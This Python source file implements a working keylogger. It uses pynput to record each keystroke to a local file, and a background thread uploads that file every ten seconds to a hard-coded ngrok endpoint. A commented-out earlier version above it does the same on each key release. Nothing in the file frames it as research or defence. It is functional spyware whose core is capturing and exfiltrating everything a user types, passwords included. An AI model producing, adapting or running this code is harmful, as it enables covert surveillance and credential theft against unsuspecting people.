# from pynput.keyboard import Key, Listener
# import time
# import main_3
# import requests
# import os
# time.sleep(2)

# # Function to upload the file to the Flask server
# def upload_file_to_server(file_path):
#     url = "your_new_url/upload"  # Replace with your ngrok URL
#     with open(file_path, "rb") as f:
#         files = {"file": f}
#         response = requests.post(url, files=files)
#         print(response.text)

# keys = []
# def on_press(key):
#     keys.append(key)
#     write_file(key)
# def write_file(key):  
#     with open('keylog.txt', 'a') as f:  
#         key = str(key).replace("'", ""+ '\n')  
#         f.write(key)
#         f.write(' ')
# def on_release(key):
#     upload_file_to_server('keylog.txt')
#     if key == Key.esc:  
#         return False
# time.sleep(5)
# with Listener(on_press=on_press,
#               on_release=on_release) as listener:  
#     listener.join()

from pynput.keyboard import Key, Listener
import time
import requests
import threading
import main_3
keys = []
file_lock = threading.Lock()  # Lock for file operations
last_key = None  # Track the last logged key

# Function to upload the file to the Flask server
def upload_file_to_server(file_path):
    url = "https://ce30-38-137-24-18.ngrok-free.app/upload"  # Replace with your ngrok URL
    try:
        with open(file_path, "rb") as f:
            files = {"file": f}
            response = requests.post(url, files=files)
            #print(response.text)
    except Exception as e:
        print(f"Error uploading file: {e}")

# Function to handle key press events
def on_press(key):
    global last_key
    with file_lock:
        try:
            # Convert the key to a string and remove extra characters
            key_str = str(key).replace("'", "")
            
            # Check if the key is the same as the last logged key
            if last_key != key_str:
                keys.append(key_str)
                write_file(key_str)
                last_key = key_str  # Update the last logged key
        except Exception as e:
            print(f"Error in on_press: {e}")

# Function to write keys to the file
def write_file(key_str):
    with open('keylog.txt', 'a') as f:
        f.write(key_str + '\n')

# Function to handle key release events
def on_release(key):
    if key == Key.esc:
        return False

# Function to continuously upload the file
def upload_loop():
    while True:
        time.sleep(10)  # Upload every 10 seconds
        with file_lock:
            upload_file_to_server('keylog.txt')

# Start the upload loop in a separate thread
upload_thread = threading.Thread(target=upload_loop)
upload_thread.daemon = True  # Make the thread a daemon so it exits when the main program exits
upload_thread.start()

# Start listening to keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()